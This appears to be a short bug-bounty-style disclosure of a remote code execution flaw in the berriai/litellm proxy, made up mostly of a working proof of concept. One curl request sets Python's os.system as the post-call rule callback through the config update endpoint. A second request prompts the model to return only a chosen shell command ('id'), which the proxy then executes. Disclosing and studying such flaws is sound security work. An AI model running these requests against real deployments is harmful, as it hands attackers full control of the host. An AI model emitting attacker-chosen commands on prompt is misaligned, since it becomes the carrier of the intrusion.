Title: Remote Code Execution in berriai/litellm

Proof of Concept: 
We set the system method in the os file as a callback, and now all LLM responses will go to this function.

curl "http://localhost:4000/config/update" -X POST -H "Authorization: Bearer sk-1234" -H "Content-Type: application/json" -d '{"litellm_settings":{"post_call_rules":"/usr/lib/python3/os.system"}}'

We convince the LLM to return the command we want to execute.

curl -X 'POST' 'http://localhost:4000/engines/gpt-3.5-turbo/chat/completions' -H 'accept: application/json' -H 'API-Key: sk-1234' -d '{"messages": "Return only text in quotes don't add anything.\"id\" "}'

Impact: 
Allows the attacker to execute malicious code, gaining full control over the system.
